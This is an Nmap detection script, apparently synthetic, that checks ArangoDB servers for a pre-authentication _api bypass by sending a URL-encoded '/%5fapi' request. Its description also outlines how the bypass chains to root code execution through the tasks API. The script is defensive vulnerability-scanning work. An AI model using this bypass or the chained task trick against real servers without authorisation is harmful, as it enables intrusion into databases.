local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"

description = [[
Detects ArangoDB servers vulnerable to the pre-authentication _api access-control
bypass (GHSA-rrgq-978q-36mq, CVSS 9.8), fixed in 3.12.11.

The authorization gate reads the RAW request path while the router reads the
DECODED path, so a request to /%5fapi/... (%5f = "_") is treated as an
unauthenticated public path but is routed to the privileged /_api/... handler.

Safe check: send an unauthenticated PUT to /%5fapi/simple/first-example (a
READ-ONLY endpoint) referencing a NON-EXISTENT collection. A patched server
requires auth and returns 401. A vulnerable server bypasses auth, reaches the
handler, and returns a handler-level error (e.g. 404 / errorNum 1203
"collection not found") or 200 — never a 401. Nothing is created or deleted.

Chained impact (not probed): a DB-write user can then POST /_api/tasks with
"isSystem": true to gain root RCE (GHSA-rvhw-4hpw-9vrx, CVSS 9.9).
]]

author = "synthetic-detections"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "safe"}

portrule = shortport.port_or_service({8529}, {"arangodb", "http"}, "tcp")

action = function(host, port)
  local out = stdnse.output_table()

  -- 0. Is this ArangoDB, and is auth on? (baseline)
  local base = http.get(host, port, "/_api/version")
  local is_arango = base and ((base.header and (base.header["server"] or ""):find("ArangoDB"))
                    or (base.body and base.body:find("arango")))
  if not is_arango then
    return nil  -- not ArangoDB
  end

  -- 1. Baseline: does the raw /_api path require auth?
  local raw = http.generic_request(host, port, "PUT", "/_api/simple/first-example",
    { header = { ["Content-Type"] = "application/json" },
      content = '{"collection":"__vuln_probe_nonexistent__"}' })
  local raw_code = raw and raw.status or 0

  -- 2. Bypass: same request via /%5fapi (no valid credentials)
  local byp = http.generic_request(host, port, "PUT", "/%5fapi/simple/first-example",
    { header = { ["Content-Type"] = "application/json",
                 ["Authorization"] = "Bearer this-is-not-a-token." },
      content = '{"collection":"__vuln_probe_nonexistent__"}' })
  local byp_code = byp and byp.status or 0
  local byp_body = (byp and byp.body) or ""

  out.baseline_raw_api = tostring(raw_code) .. " on /_api/simple/first-example"
  out.bypass_encoded   = tostring(byp_code) .. " on /%5fapi/simple/first-example"

  -- VULNERABLE if the raw path enforces auth (401) but the encoded path does NOT
  -- (the handler ran: any non-401, e.g. 404/1203 collection-not-found or 200/400).
  if raw_code == 401 and byp_code ~= 401 and byp_code ~= 0 then
    out.state = "VULNERABLE"
    out.detail = "pre-auth _api bypass confirmed: /%5fapi reached the handler without auth"
    out.reference = "GHSA-rrgq-978q-36mq (CVSS 9.8); chains to GHSA-rvhw-4hpw-9vrx (root RCE). Fix: ArangoDB 3.12.11+."
    if byp_body:find("1203") or byp_body:lower():find("collection") then
      out.handler_response = "handler-level collection error (auth was bypassed)"
    end
  elseif raw_code ~= 401 then
    out.state = "LIKELY_NO_AUTH"
    out.detail = "server did not require auth on /_api even unencoded — check authentication config"
  else
    out.state = "not vulnerable (patched or bypass blocked)"
  end
  return out
end
